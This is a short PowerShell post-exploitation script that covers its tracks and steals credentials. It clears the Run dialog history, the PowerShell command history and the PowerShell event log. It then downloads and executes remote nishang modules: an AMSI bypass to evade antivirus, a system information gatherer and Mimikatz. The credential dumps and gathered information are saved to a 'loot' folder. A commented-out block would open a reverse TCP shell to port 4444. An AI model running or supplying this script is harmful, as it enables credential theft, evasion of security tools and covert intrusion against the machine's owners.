# Clear Run History and POSH Command History
RP -Pa 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*' -ErrorA Si
rm (Get-PSReadlineOption).HistorySavePath -ErrorA Si

# Essential Variables
$ip = '127.0.0.1'
$ws = New-Object -Com WScript.Shell
$wc = New-Object Net.WebClient
$sapi = New-Object -Com SAPI.SPVoice

# WARNING: Privileged Command
Clear-EventLog "Windows Powershell" -ErrorA Si

# Create Loot folder
mkdir loot

# Load AmsiBypass to get past AV memory detection
IEX $wc.DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Bypass/Invoke-AmsiBypass.ps1')
Invoke-AmsiBypass

# Load Get-Information
IEX $wc.DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1')
Get-Information > loot\$env:ComputerName-info.txt

# Load Mimikatz
IEX $wc.DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
Invoke-Mimikatz > loot\$env:ComputerName-mimikatz.txt

# Load Invoke-PowershellTcp
# IEX $wc.DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')
# Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port 4444